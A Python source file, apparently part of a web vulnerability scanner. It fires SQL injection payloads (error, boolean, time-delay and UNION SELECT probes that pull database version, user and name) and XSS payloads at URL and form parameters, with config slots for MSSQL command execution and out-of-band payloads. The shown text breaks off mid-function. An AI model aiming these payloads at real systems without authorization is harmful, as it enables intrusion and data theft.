import time
import requests
import hashlib
import logging
import sys
import os
import re
import json
from urllib.parse import quote, unquote, urlparse, parse_qs, urljoin, urlunparse, urlencode
from bs4 import BeautifulSoup

# 导入模块（假设模块结构不变）
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from modules.request_manager import RateLimiter
    from modules.request_queue import RequestQueueManager
    from modules.request_sender import RequestSender
    from modules.request_builder import RequestBuilder
    from modules.response_parse import ResponseParse
    from utils import load_config, load_sqli_config, load_xss_payload,print_colored
    
    print("✅ 所有模块导入成功")
except ImportError as e:
    print(f"❌ 导入模块失败: {e}")
    print("请确保以下模块存在：")
    print("1. modules/request_manager.py")
    print("2. modules/request_queue.py")
    print("3. modules/request_sender.py")
    print("4. modules/request_builder.py")
    print("5. modules/response_parse.py")
    print("6. utils.py")
    sys.exit(1)

class sampilescanner:
    def __init__(self, config=None):
        self.config = config or load_config()
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; rv:109.0) Gecko/20100101 Firefox/115.0"
        })
        
        # 获取日志记录器
        self.logger = logging.getLogger('vuln_scanner.scan.port')

        # 加载SQL注入配置文件
        self.sql_config = load_sqli_config()
        
        # 初始化速率限制器
        self.rate_limiter = RateLimiter(
            max_requests_per_second=self.config.get("max_requests_per_second", 20),
            max_requests_per_minute=self.config.get("max_requests_per_minute", 600)
        )
        
        # 初始化请求队列
        self.request_queue = RequestQueueManager(
            max_concurrent=self.config.get("max_concurrent_requests", 5),
            max_queue_size=self.config.get("max_queue_size", 100),
            rate_limiter=self.rate_limiter
        )
        
        # 初始化请求发送器
        self.request_sender = RequestSender(
            timeout=self.config.get("request_timeout", 10),
            verify_ssl=self.config.get("verify_ssl", False),
            user_agent=self.config.get("user_agent"),
            proxies=self.config.get("proxies"),
            max_retries=self.config.get("max_retries", 3)
        )

        # 初始化请求构造器和响应解析器
        self.request_builder = RequestBuilder()
        self.response_parser = ResponseParse()

        # XSS检测配置
        self.xss_payloads = load_xss_payload() if 'load_xss_payload' in globals() else self._get_default_xss_payloads()
        self.xss_indicators = [
            "<script>alert", "<script>confirm", "<script>prompt",
            "javascript:", "onerror=", "onload=", "onclick=", "onmouseover=",
            "<svg/onload=", "<img src=x onerror=", "<body onload=", "<iframe src="
        ]
        
        # 基准响应存储（用于布尔盲注对比）
        self.baseline_responses = {}
        
        # 预构建的SQL注入payload集合
        self.sql_payloads = self._build_sql_payloads()
        
        # 结果存储
        self.results = {
            "requests": [],
            "responses": [],
            "statistics": {},
            'vulnerabilities': [],
            'sql_statistics': {
                "total_tested": 0,
                "vulnerable_urls": 0,
                "by_type": {},
                "by_database": {},
                "by_method": {}
            }
        }
        
        # SQL注入检测阈值配置
        self.sql_thresholds = {
            "time_based_threshold": self.sql_config.get("time_based_threshold", 3.0),
            "response_similarity_threshold": 0.7,
            "length_variation_threshold": 0.3
        }



    def _get_default_xss_payloads(self):
        """默认XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>"
        ]

    def _get_default_sql_config(self):
        """默认SQL注入配置"""
        return {
            "time_based_threshold": 3.0,
            "payloads": {
                "generic_error_based": ["'", "\"", "' OR '1'='1"],
                "mysql_specific": {
                    "error_based": ["' AND (SELECT 1 FROM (SELECT SLEEP(5))a) --"],
                    "boolean_based": ["' AND 1=1 --"],
                    "time_based": ["' AND SLEEP(5) --"]
                }
            },
            "error_indicators": {
                "mysql": ["you have an error in your sql syntax", "warning: mysql"],
                "mssql": ["unclosed quotation mark", "sql server"],
                "postgresql": ["postgresql error"],
                "oracle": ["ora-"]
            },
            "boolean_indicators": {
                "true_indicators": ["welcome", "success", "exists"],
                "false_indicators": ["error", "invalid", "not found"]
            }
        }

    def _build_sql_payloads(self):
        """从配置文件构建SQL注入payload集合"""
        payloads = {
            "error_based": [],
            "boolean_based": [],
            "time_based": [],
            "union_based": [],
            "stacked": [],
            "oob": [],
            "comment_based": [],
            "second_order": []
        }
        
        config_payloads = self.sql_config.get("payloads", {})
        
        # 通用错误型payload
        if "generic_error_based" in config_payloads:
            for payload in config_payloads["generic_error_based"]:
                payloads["error_based"].append({"payload": payload, "database": "generic", "type": "error"})
        
        # 注释型payload
        if "comment_based" in config_payloads:
            for payload in config_payloads["comment_based"]:
                payloads["comment_based"].append({"payload": payload, "database": "generic", "type": "comment"})
        
        # DNS外带payload
        if "dns_exfiltration" in config_payloads:
            for payload in config_payloads["dns_exfiltration"]:
                payloads["oob"].append({"payload": payload, "database": "generic", "type": "oob"})
        
        # 数据库特定payload
        db_types = ["mysql_specific", "mssql_specific", "postgresql_specific", "oracle_specific"]
        
        for db_type in db_types:
            if db_type in config_payloads:
                db_name = db_type.replace("_specific", "")
                
                # 错误型payload
                if "error_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["error_based"]:
                        payloads["error_based"].append({"payload": payload, "database": db_name, "type": "error"})
                
                # 布尔型payload
                if "boolean_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["boolean_based"]:
                        payloads["boolean_based"].append({"payload": payload, "database": db_name, "type": "boolean"})
                
                # 时间型payload
                if "time_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["time_based"]:
                        payloads["time_based"].append({"payload": payload, "database": db_name, "type": "time"})
                
                # 联合查询payload
                if "union_based" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["union_based"]:
                        payloads["union_based"].append({"payload": payload, "database": db_name, "type": "union"})
                
                # 堆叠查询payload (MSSQL)
                if db_name == "mssql" and "stacked_queries" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["stacked_queries"]:
                        payloads["stacked"].append({"payload": payload, "database": db_name, "type": "stacked"})
                
                # 命令执行payload (MSSQL)
                if db_name == "mssql" and "command_execution" in config_payloads[db_type]:
                    for payload in config_payloads[db_type]["command_execution"]:
                        payloads["stacked"].append({"payload": payload, "database": db_name, "type": "command"})
        
        # 带外数据payload
        if "oob_out_of_band" in config_payloads:
            for payload in config_payloads["oob_out_of_band"]:
                payloads["oob"].append({"payload": payload, "database": "generic", "type": "oob"})
        
        # 二阶注入payload
        if "second_order_injection" in config_payloads:
            for payload in config_payloads["second_order_injection"]:
                payloads["second_order"].append({"payload": payload, "database": "generic", "type": "second_order"})
        
        # 混合payload
        if "hybrid_payloads" in config_payloads:
            for payload in config_payloads["hybrid_payloads"]:
                payloads["error_based"].append({"payload": payload, "database": "generic", "type": "hybrid"})
        
        # 输出统计信息
        for payload_type, payload_list in payloads.items():
            print(f"📦 加载 {payload_type} payload: {len(payload_list)} 个")
        
        return payloads

    def _collect_statistics(self):
        """收集统计信息"""
        self.results['statistics'] = {
            'request_stats': self.request_sender.get_statistics() if hasattr(self.request_sender, 'get_statistics') else {},
            'queue_stats': self.request_queue.get_statistics() if hasattr(self.request_queue, 'get_statistics') else {},
            'rate_limit_stats': self.rate_limiter.get_stats() if hasattr(self.rate_limiter, 'get_stats') else {},
            'scan_duration': f"{time.time():.2f}s"
        }

    # def send_controlled_request(self, request_info):
    #     """发送受控制的请求"""
    #     def _make_request():
    #         method = request_info.get('method', 'GET')
    #         url = request_info.get('url')

    #         if not url:
    #             raise ValueError("请求URL不能为空")

    #         # 发送请求
    #         response = self.request_sender.send_request(
    #             method=method,
    #             url=url,
    #             params=request_info.get('params'),
    #             data=request_info.get('data'),
    #             json_data=request_info.get('json'),
    #             headers=request_info.get('headers'),
    #             cookies=request_info.get('cookies'),
    #             allow_redirects=request_info.get('allow_redirects', True)
    #         )

    #         # 确保响应文本是字符串
    #         response_text = response.text
    #         if not isinstance(response_text, str):
    #             if response_text is None:
    #                 response_text = ''
    #             else:
    #                 response_text = str(response_text)

    #         # 确保响应内容长度是整数
    #         content_length = len(response.content) if hasattr(response, 'content') else 0

    #         # 解析响应
    #         parsed_response = {}
    #         if hasattr(self.response_parser, 'parse_response'):
    #             try:
    #                 parsed_response = self.response_parser.parse_response(
    #                     response,
    #                     extract_links=True,
    #                     extract_forms=True,
    #                     base_url=url
    #                 )
    #             except Exception as e:
    #                 print(f"解析响应时出错: {e}")
    #                 parsed_response = {}

    #         return {
    #             'request': request_info,
    #             'response': {
    #                 'status_code': response.status_code if hasattr(response, 'status_code') else 0,
    #                 'url': str(response.url) if hasattr(response, 'url') else url,
    #                 'headers': dict(response.headers) if hasattr(response, 'headers') else {},
    #                 'text': response_text,
    #                 'content': response_text,
    #                 'content_length': content_length
    #             },
    #             'parsed': parsed_response
    #         }

    #     # 提交到队列
    #     task_id = f"req_{int(time.time() * 1000)}_{hash(str(request_info)) % 10000}"

    #     self.request_queue.submit(task_id, _make_request)

    #     # 等待结果
    #     try:
    #         result = self.request_queue.get_result(task_id, timeout=30)

    #         # 记录结果
    #         self._record_request_result(result)

    #         return result

    #     except Exception as e:
    #         self.logger.error(f"请求失败: {request_info.get('url')} - {e}") if self.logger else print(f"请求失败: {request_info.get('url')} - {e}")
    #         return None


    def parse_cookies(self,cookies_input):
        """
        将cookies字符串转换为字典
        支持格式：
        1. "name1=value1; name2=value2" (分号分隔)
        2. JSON格式: '{"name1": "value1", "name2": "value2"}'
        3. 已经是字典则直接返回
        将多种格式的Cookie输入转换为字典。
        支持：字典、字符串（分号分隔）、JSON字符串。
        """
        if not cookies_input:
            return {}

        # 1. 如果已经是字典，直接返回
        if isinstance(cookies_input, dict):
            return cookies_input.copy()  # 返回副本避免意外修改

        # 2. 如果是字符串
        if isinstance(cookies_input, str):
            cookies_input = cookies_input.strip()
            # 2.1 尝试解析为JSON（以{开头}）
            if cookies_input.startswith('{') and cookies_input.endswith('}'):
                try:
                    return json.loads(cookies_input)
                except json.JSONDecodeError:
                    pass  # 不是合法JSON，继续按字符串解析
                
            # 2.2 按分号分割的键值对解析
            cookies_dict = {}
            # 处理可能存在的'Cookie:'前缀
            if cookies_input.lower().startswith('cookie:'):
                cookies_input = cookies_input[7:].strip()

            pairs = cookies_input.split(';')
            for pair in pairs:
                pair = pair.strip()
                if not pair:  # 跳过空字符串
                    continue
                # 关键：使用 split('=', 1)，只分割第一个等号，确保值中的等号不被分割
                if '=' in pair:
                    key, value = pair.split('=', 1)
                    cookies_dict[key.strip()] = value.strip()
                else:
                    # 对于没有等号的情况（虽然不符合标准，但有时会出现），将整个字符串作为键，值为空
                    cookies_dict[pair] = ''

            return cookies_dict
    
        # 3. 其他不支持的类型（如列表、元组）
        # 可以根据需要扩展，例如处理 [("name", "value")] 格式
        return {}

    def send_controlled_request(self, request_info):
        """发送受控制的请求"""
        # 添加安全的调试信息
        # try:
        #     # 尝试获取队列状态（使用实际存在的属性）
        #     if hasattr(self.request_queue, 'get_statistics'):
        #         stats = self.request_queue.get_statistics()
        #         print(f"[DEBUG] 队列状态: {stats}")
        # except:
        #     pass
        
        # try:
        #     if hasattr(self.rate_limiter, 'get_stats'):
        #         rate_stats = self.rate_limiter.get_stats()
        #         print(f"[DEBUG] 速率限制状态: {rate_stats}")
        # except:
        #     pass
        cookies_str=self.config.get("cookies")
        cookies = self.parse_cookies(cookies_str)
        #print(cookies)
        def _make_request():
            method = request_info.get('method', 'GET')
            url = request_info.get('url')

            if not url:
                raise ValueError("请求URL不能为空")

            # 发送请求
            response = self.request_sender.send_request(
                method=method,
                url=url,
                params=request_info.get('params'),
                data=request_info.get('data'),
                json_data=request_info.get('json'),
                headers=request_info.get('headers'),
                cookies=cookies,
                allow_redirects=request_info.get('allow_redirects', True)
            )
            #print(request_info.get('cookies'))
            # 确保响应文本是字符串
            response_text = response.text
            if not isinstance(response_text, str):
                if response_text is None:
                    response_text = ''
                else:
                    response_text = str(response_text)

            # 确保响应内容长度是整数
            content_length = len(response.content) if hasattr(response, 'content') else 0

            # 解析响应
            parsed_response = {}
            if hasattr(self.response_parser, 'parse_response'):
                try:
                    parsed_response = self.response_parser.parse_response(
                        response,
                        extract_links=True,
                        extract_forms=True,
                        base_url=url
                    )
                except Exception as e:
                    print(f"解析响应时出错: {e}")
                    parsed_response = {}

            return {
                'request': request_info,
                'response': {
                    'status_code': response.status_code if hasattr(response, 'status_code') else 0,
                    'url': str(response.url) if hasattr(response, 'url') else url,
                    'headers': dict(response.headers) if hasattr(response, 'headers') else {},
                    'text': response_text,
                    'content': response_text,
                    'content_length': content_length
                },
                'parsed': parsed_response
            }

        # 提交到队列
        task_id = f"req_{int(time.time() * 1000)}_{hash(str(request_info)) % 10000}"

        #print(f"[DEBUG] 提交任务: {task_id} - URL: {request_info.get('url', 'N/A')}")

        try:
            self.request_queue.submit(task_id, _make_request)
        except Exception as e:
            print(f"[ERROR] 提交任务失败: {e}")
            # 如果队列提交失败，尝试直接执行请求
            print("[INFO] 尝试直接执行请求...")
            try:
                result = _make_request()
                self._record_request_result(result)
                return result
            except Exception as e2:
                print(f"[ERROR] 直接请求也失败: {e2}")
                return None

        # 等待结果
        try:
            result = self.request_queue.get_result(task_id, timeout=30)

            # 记录结果
            self._record_request_result(result)

            #print(f"[DEBUG] 任务完成: {task_id} - 状态码: {result.get('response', {}).get('status_code', 'N/A')}")

            return result

        except Exception as e:
            error_msg = f"请求失败: {request_info.get('url')} - {e}"
            if self.logger:
                self.logger.error(error_msg)
            else:
                print(error_msg)
            return None

    def _record_request_result(self, result):
        """记录请求结果"""
        if not result:
            return
        
        self.results['requests'].append(result['request'])
        self.results['responses'].append(result['response'])
        self._collect_statistics()

    # ==================== SQL注入检测增强方法 ====================
    
    def get_baseline_response(self, url, param_name, param_value, method, post_data):
        """获取基准响应"""
        baseline_key = f"{url}_{param_name}_{method}"

        if baseline_key in self.baseline_responses:
            return self.baseline_responses[baseline_key]

        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }

            if method.upper() == "GET":
                # 构建带参数的URL
                parsed_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = parsed_url
            else:
                # POST请求
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data

            response = self.send_controlled_request(request_info)

            if response and 'response' in response:
                # 安全地处理响应内容，确保是字符串
                response_data = response['response']
                content = response_data.get('content', '')
                content_length = response_data.get('content_length', 0)
                status_code = response_data.get('status_code', 0)
                headers = response_data.get('headers', {})

                # 确保content是字符串
                if isinstance(content, (list, tuple, dict)):
                    content = str(content)

                baseline = {
                    'content': content,
                    'length': content_length,
                    'status': status_code,
                    'time': 0,
                    'headers': headers,
                    'hash': hashlib.md5(content.encode()).hexdigest() if content else ''
                }

                self.baseline_responses[baseline_key] = baseline
                return baseline

        except Exception as e:
            print(f"获取基准响应失败: {e}")
            import traceback
            traceback.print_exc()

        return None

    def _build_url_with_param(self, url, param_name, value):
        """构建带参数的URL"""
        # 确保url是字符串
        if not isinstance(url, str):
            if isinstance(url, list):
                print(f"⚠️  _build_url_with_param: url参数是列表，使用第一个元素")
                url = url[0] if url else ""
            else:
                url = str(url)

        # 如果url为空，返回空字符串
        if not url:
            return ""

        try:
            parsed = urlparse(url)
            query_dict = parse_qs(parsed.query)
            query_dict[param_name] = [value]

            new_query = urlencode(query_dict, doseq=True)
            return parsed._replace(query=new_query).geturl()
        except Exception as e:
            print(f"❌ 构建URL参数失败: {e}")
            # 如果解析失败，尝试简单拼接
            if '?' in url:
                return f"{url}&{param_name}={value}"
            else:
                return f"{url}?{param_name}={value}"

    # ==================== 基于错误的注入检测 ====================
    def detect_error_based(self, url, param_name, param_value, method, post_data, baseline):
        """基于错误的SQL注入检测 - 使用配置文件payload"""
        # 确保url是字符串
        if not isinstance(url, str):
            if isinstance(url, list):
                url = url[0] if url else ""
            else:
                url = str(url)

        error_payloads = self.sql_payloads.get("error_based", [])

        for payload_info in error_payloads:
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")

            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }

                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    if not test_url:  # 如果构建URL失败，跳过
                        continue
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data

                response = self.send_controlled_request(request_info)

                if response and 'response' in response:
                    # 确保响应内容是字符串
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content) if content is not None else ''

                    # 检查响应中是否包含数据库错误信息
                    error_found = self._check_for_database_errors(content)

                    if error_found:
                        return {
                            'type': 'Error-Based SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            #'confidence': 'High',
                            'confidence': '高',
                            'evidence': error_found[:200],
                            'response_code': response['response'].get('status_code', 0),
                            'response_length': len(content),
                            'technique': 'Error message disclosure'
                        }

            except Exception as e:
                # 不再打印每个payload的详细错误，只记录一次
                continue
            
        # 如果没有使用配置payload检测到，使用简单payload再试一次
        simple_payloads = ["'", "\"", "' OR '1'='1"]
        for payload in simple_payloads:
            try:
                test_value = f"{param_value}{payload}"
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }

                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    if not test_url:  # 如果构建URL失败，跳过
                        continue
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data

                response = self.send_controlled_request(request_info)

                if response and 'response' in response:
                    # 确保响应内容是字符串
                    content = response['response'].get('content', '')
                    if not isinstance(content, str):
                        content = str(content) if content is not None else ''

                    error_found = self._check_for_database_errors(content)

                    if error_found:
                        return {
                            'type': 'Error-Based SQL Injection',
                            'payload': payload,
                            'database': 'generic',
                            'confidence': 'High',
                            'evidence': error_found[:200],
                            'response_code': response['response'].get('status_code', 0),
                            'response_length': len(content),
                            'technique': 'Error message disclosure'
                        }

            except Exception as e:
                continue
            
        return None
    
    def _ensure_string_url(self, url_input):
        """确保URL是字符串类型"""
        if isinstance(url_input, str):
            return url_input
        elif isinstance(url_input, list):
            if url_input:
                return str(url_input[0])
            else:
                return ""
        elif url_input is None:
            return ""
        else:
            return str(url_input)

    def _check_for_database_errors(self, response_text):
        """检查响应中的数据库错误信息 - 使用配置文件中的错误指示器"""
        # 确保response_text是字符串
        if not isinstance(response_text, str):
            if response_text is None:
                response_text = ''
            else:
                response_text = str(response_text)

        # 首先检查配置文件中的错误指示器
        error_indicators = self.sql_config.get("error_indicators", {})

        # 检查通用错误指示器
        if "generic" in error_indicators:
            for indicator in error_indicators["generic"]:
                if indicator.lower() in response_text.lower():
                    return f"Generic SQL error: {indicator}"

        # 检查特定数据库错误指示器
        db_types = ["mysql", "mssql", "postgresql", "oracle", "sqlite"]
        for db_type in db_types:
            if db_type in error_indicators:
                for indicator in error_indicators[db_type]:
                    if indicator.lower() in response_text.lower():
                        return f"{db_type.upper()} error: {indicator}"

        # 如果配置文件没有找到，使用内置模式
        error_patterns = [
            r"SQL syntax.*MySQL",
            r"Warning.*mysql_.*",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"PostgreSQL.*ERROR",
            r"Warning.*\Wpg_.*",
            r"valid PostgreSQL result",
            r"SQLite/JDBCDriver",
            r"System.Data.SQLite.SQLiteException",
            r"Warning.*sqlite_.*",
            r"Microsoft OLE DB Provider for ODBC Drivers",
            r"Microsoft OLE DB Provider for SQL Server",
            r"SQL Server.*Driver",
            r"Msg \d+, Level \d+, State \d+",
            r"Unclosed quotation mark",
            r"Syntax error.*SQL",
            r"ORA-\d{5}",
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*oci_.*",
            r"PostgreSQL query failed"
        ]

        for pattern in error_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return match.group(0)

        return None

    # ==================== 布尔盲注检测 ====================
    def detect_boolean_based(self, url, param_name, param_value, method, post_data, baseline):
        """布尔盲注检测 - 使用配置文件payload"""
        if not baseline:
            return None
        
        boolean_payloads = self.sql_payloads.get("boolean_based", [])
        
        if not boolean_payloads:
            # 如果没有配置的布尔payload，使用默认的
            true_payloads = ["' AND '1'='1", "' AND 1=1", "' OR 1=1--"]
            false_payloads = ["' AND '1'='2", "' AND 1=2", "' OR 1=2--"]
        else:
            # 使用配置文件中的payload，分别测试真/假条件
            true_payloads = []
            false_payloads = []
            for payload_info in boolean_payloads:
                payload = payload_info.get("payload", "")
                # 简单判断：包含"1=1"的为真条件，包含"1=2"的为假条件
                if "1=1" in payload or "'1'='1" in payload:
                    true_payloads.append(payload)
                elif "1=2" in payload or "'1'='2" in payload:
                    false_payloads.append(payload)
        
        # 如果没有区分出真/假payload，全部当作真条件测试
        if not true_payloads and boolean_payloads:
            true_payloads = [p.get("payload", "") for p in boolean_payloads[:3]]
        
        # 测试真条件
        true_response = None
        for payload in true_payloads[:3]:  # 只测试前3个
            true_response = self._test_boolean_condition(
                url, param_name, param_value, method, post_data, payload
            )
            if true_response:
                break
        
        # 测试假条件
        false_response = None
        for payload in false_payloads[:3]:  # 只测试前3个
            false_response = self._test_boolean_condition(
                url, param_name, param_value, method, post_data, payload
            )
            if false_response:
                break
        
        if true_response and false_response:
            # 对比响应差异
            similarity_with_true = self._calculate_similarity(
                baseline['content'], true_response['content']
            )
            similarity_with_false = self._calculate_similarity(
                baseline['content'], false_response['content']
            )
            
            # 布尔盲注特征：真条件与基准相似，假条件与基准不同
            if (similarity_with_true > self.sql_thresholds['response_similarity_threshold'] and 
                similarity_with_false < self.sql_thresholds['response_similarity_threshold']):
                
                # 进一步验证：检查内容长度差异
                length_diff_true = abs(baseline['length'] - true_response['length']) / baseline['length'] if baseline['length'] > 0 else 0
                length_diff_false = abs(baseline['length'] - false_response['length']) / baseline['length'] if baseline['length'] > 0 else 0
                
                if length_diff_false > length_diff_true * 2:  # 假条件响应有明显差异
                    return {
                        'type': 'Boolean-Based Blind SQL Injection',
                        #'confidence': 'Medium-High',
                        'confidence': '中',
                        'evidence': {
                            'true_similarity': similarity_with_true,
                            'false_similarity': similarity_with_false,
                            'length_difference': {
                                'baseline': baseline['length'],
                                'true': true_response['length'],
                                'false': false_response['length']
                            }
                        },
                        'technique': 'Boolean condition differential'
                    }
        
        return None

    def _test_boolean_condition(self, url, param_name, param_value, method, post_data, payload):
        """测试布尔条件"""
        try:
            test_value = f"{param_value}{payload}"
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }

            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, test_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = test_value
                request_info['data'] = data

            response = self.send_controlled_request(request_info)

            if response and 'response' in response:
                content = response['response'].get('content', '')
                # 确保content是字符串
                if isinstance(content, (list, tuple, dict)):
                    content = str(content)

                return {
                    'content': content,
                    'length': response['response'].get('content_length', 0),
                    'status': response['response'].get('status_code', 0)
                }

        except Exception:
            return None
    
    # ==================== 时间盲注检测 ====================
    def detect_time_based(self, url, param_name, param_value, method, post_data):
        """时间盲注检测 - 使用配置文件payload"""
        time_payloads = self.sql_payloads.get("time_based", [])
        
        if not time_payloads:
            # 如果没有配置的时间payload，使用默认的
            time_payloads = [
                {"payload": "' AND SLEEP(5)--", "database": "mysql"},
                {"payload": "' OR SLEEP(5)--", "database": "mysql"},
                {"payload": "' AND (SELECT pg_sleep(5))--", "database": "postgresql"},
                {"payload": "'; WAITFOR DELAY '00:00:05'--", "database": "mssql"},
                {"payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0--", "database": "oracle"}
            ]
        
        # 首先获取正常响应时间
        normal_time = self._measure_response_time(url, param_name, param_value, method, post_data)
        
        for payload_info in time_payloads[:5]:  # 只测试前5个，避免耗时过长
            payload = payload_info.get("payload", "")
            db_type = payload_info.get("database", "generic")
            
            try:
                test_value = f"{param_value}{payload}"
                start_time = time.time()
                
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True,
                    'timeout': self.sql_thresholds['time_based_threshold'] + 10
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                elapsed_time = time.time() - start_time
                
                # 检查是否超时或明显延迟
                if elapsed_time > self.sql_thresholds['time_based_threshold']:
                    # 验证：发送不延迟的payload对比
                    no_delay_value = f"{param_value}' AND '1'='1"
                    no_delay_time = self._measure_response_time(
                        url, param_name, no_delay_value, method, post_data
                    )
                    
                    if elapsed_time > no_delay_time * 3:  # 延迟至少3倍
                        return {
                            'type': 'Time-Based Blind SQL Injection',
                            'payload': payload,
                            'database': db_type,
                            #'confidence': 'Medium',
                            'confidence': '中',
                            'evidence': {
                                'normal_response_time': normal_time,
                                'delayed_response_time': elapsed_time,
                                'threshold': self.sql_thresholds['time_based_threshold']
                            },
                            'technique': 'Time delay'
                        }
                        
            except Exception as e:
                # 超时也可能是时间盲注的特征
                if "timeout" in str(e).lower() or "time out" in str(e).lower():
                    return {
                        'type': 'Time-Based Blind SQL Injection (Timeout)',
                        'payload': payload,
                        'database': db_type,
                        #'confidence': 'Low-Medium',
                        'confidence': '中',
                        'evidence': 'Request timeout occurred',
                        'technique': 'Request timeout'
                    }
                continue
        
        return None

    def _measure_response_time(self, url, param_name, param_value, method, post_data):
        """测量响应时间"""
        try:
            start_time = time.time()
            
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            response = self.send_controlled_request(request_info)
            if response:
                return time.time() - start_time
        except:
            return float('inf')
    
    # ==================== 联合查询检测 ====================
    def detect_union_based(self, url, param_name, param_value, method, post_data, baseline):
        """联合查询注入检测"""
        # 先探测列数
        column_count = self._detect_column_count(url, param_name, param_value, method, post_data)
        
        if column_count > 0:
            # 尝试在可显示位置注入标记
            marker = "SQL_INJECTION_TEST_" + str(int(time.time()))
            
            # 构建联合查询payload
            select_parts = []
            for i in range(column_count):
                if i == 0:  # 第一个位置放标记
                    select_parts.append(f"'{marker}'")
                else:
                    select_parts.append("NULL")
            
            union_payload = f"' UNION SELECT {','.join(select_parts)}--"
            test_value = f"{param_value}{union_payload}"
            
            try:
                request_info = {
                    'method': method.upper(),
                    'url': url,
                    'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                    'allow_redirects': True
                }
                
                if method.upper() == "GET":
                    test_url = self._build_url_with_param(url, param_name, test_value)
                    request_info['url'] = test_url
                else:
                    data = post_data.copy() if post_data else {}
                    data[param_name] = test_value
                    request_info['data'] = data
                
                response = self.send_controlled_request(request_info)
                
                if response and 'response' in response:
                    # 检查响应中是否包含标记
                    if marker in response['response']['content']:
                        # 尝试获取数据库信息
                        info_payloads = [
                            f"' UNION SELECT version(),{','.join(['NULL']*(column_count-1))}--",
                            f"' UNION SELECT user(),{','.join(['NULL']*(column_count-1))}--",
                            f"' UNION SELECT database(),{','.join(['NULL']*(column_count-1))}--"
                        ]
                        
                        for info_payload in info_payloads:
                            info_value = f"{param_value}{info_payload}"
                            info_response = self._send_request(url, param_name, info_value, method, post_data)
                            
                            if info_response:
                                # 提取可能的数据库信息
                                db_info = self._extract_database_info(info_response['response']['content'])
                                if db_info:
                                    return {
                                        'type': 'Union-Based SQL Injection',
                                        'confidence': 'High',
                                        'column_count': column_count,
                                        'evidence': {
                                            'marker_found': True,
                                            'database_info': db_info,
                                            'injectable_column': 0
                                        },
                                        'technique': 'Union query'
                                    }
                        
                        return {
                            'type': 'Union-Based SQL Injection',
                            'confidence': 'High',
                            'column_count': column_count,
                            'evidence': {'marker_found': True},
                            'technique': 'Union query'
                        }
                        
            except Exception as e:
                pass
        
        return None

    def _detect_column_count(self, url, param_name, param_value, method, post_data):
        """探测联合查询的列数"""
        for i in range(1, 11):  # 尝试1-10列
            null_list = ['NULL'] * i
            order_payload = f"' ORDER BY {i}--"
            union_payload = f"' UNION SELECT {','.join(null_list)}--"
            
            # 先尝试ORDER BY方法
            order_value = f"{param_value}{order_payload}"
            order_response = self._send_request(url, param_name, order_value, method, post_data)
            
            if order_response and order_response['response']['status_code'] < 500:
                # 再验证UNION查询
                union_value = f"{param_value}{union_payload}"
                union_response = self._send_request(url, param_name, union_value, method, post_data)
                
                if union_response and union_response['response']['status_code'] < 500:
                    # 检查是否有语法错误
                    error = self._check_for_database_errors(union_response['response']['content'])
                    if not error:
                        return i
        
        return 0

    def _send_request(self, url, param_name, param_value, method, post_data):
        """发送请求的通用方法"""
        try:
            request_info = {
                'method': method.upper(),
                'url': url,
                'headers': self.sql_config.get("request_config", {}).get("headers", {}),
                'allow_redirects': True
            }
            
            if method.upper() == "GET":
                test_url = self._build_url_with_param(url, param_name, param_value)
                request_info['url'] = test_url
            else:
                data = post_data.copy() if post_data else {}
                data[param_name] = param_value
                request_info['data'] = data
            
            return self.send_controlled_request(request_info)
        except:
            return None

    def _calculate_similarity(self, text1, text2):
        """计算两个文本的相似度（简化版）"""
        # 确保两个参数都是字符串
